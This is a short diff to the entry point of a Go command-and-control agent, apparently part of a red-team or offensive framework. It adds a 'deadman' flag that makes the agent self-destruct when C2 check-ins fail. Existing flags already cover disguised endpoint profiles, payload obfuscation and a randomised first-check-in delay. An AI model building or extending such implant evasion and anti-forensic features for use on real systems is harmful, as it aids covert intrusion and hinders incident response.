@@ -18,19 +18,20 @@ import (
 
 func main() {
 	var (
-		serverURL  = flag.String("server", "https://127.0.0.1:443", "C2 server URL")
-		agentID    = flag.String("id", "", "agent ID (auto-generated if empty)")
-		caPath     = flag.String("ca", "", "path to CA cert PEM for server verification")
-		certPath   = flag.String("cert", "", "path to agent client cert PEM")
-		keyPath    = flag.String("key", "", "path to agent client key PEM")
-		plaintext  = flag.Bool("plaintext", false, "disable TLS (development only)")
-		logLevel   = flag.String("log-level", "info", "log level")
-		profile    = flag.String("profile", "telemetry", "endpoint profile: legacy, telemetry, cdn, webhook")
-		obfuscate  = flag.Bool("obfuscate", false, "enable payload obfuscation")
+		serverURL    = flag.String("server", "https://127.0.0.1:443", "C2 server URL")
+		agentID      = flag.String("id", "", "agent ID (auto-generated if empty)")
+		caPath       = flag.String("ca", "", "path to CA cert PEM for server verification")
+		certPath     = flag.String("cert", "", "path to agent client cert PEM")
+		keyPath      = flag.String("key", "", "path to agent client key PEM")
+		plaintext    = flag.Bool("plaintext", false, "disable TLS (development only)")
+		logLevel     = flag.String("log-level", "info", "log level")
+		profile      = flag.String("profile", "telemetry", "endpoint profile: legacy, telemetry, cdn, webhook")
+		obfuscate    = flag.Bool("obfuscate", false, "enable payload obfuscation")
 		obfuscKey    = flag.String("obfusc-key", "", "shared secret for payload obfuscation")
 		psk          = flag.String("psk", "", "pre-shared key for X-Api-Key auth")
 		maxOutput    = flag.Int("max-output", 1<<20, "max command output size in bytes")
 		initialDelay = flag.Duration("initial-delay", 30*time.Second, "random initial delay before first checkin")
+		deadman      = flag.Duration("deadman", 0, "dead-man switch: self-destruct if no C2 checkin succeeds within this duration (e.g. 24h, 0 disables)")
 	)
 	flag.Parse()
 
@@ -59,10 +60,11 @@ func main() {
 	}
 
 	cfg := agent.Config{
-		ServerURL:    *serverURL,
-		AgentID:      *agentID,
-		InitialDelay: *initialDelay,
-		MaxOutput:    *maxOutput,
+		ServerURL:      *serverURL,
+		AgentID:        *agentID,
+		InitialDelay:   *initialDelay,
+		MaxOutput:      *maxOutput,
+		DeadmanTimeout: *deadman,
 	}
 
 	a := agent.New(cfg, transport)
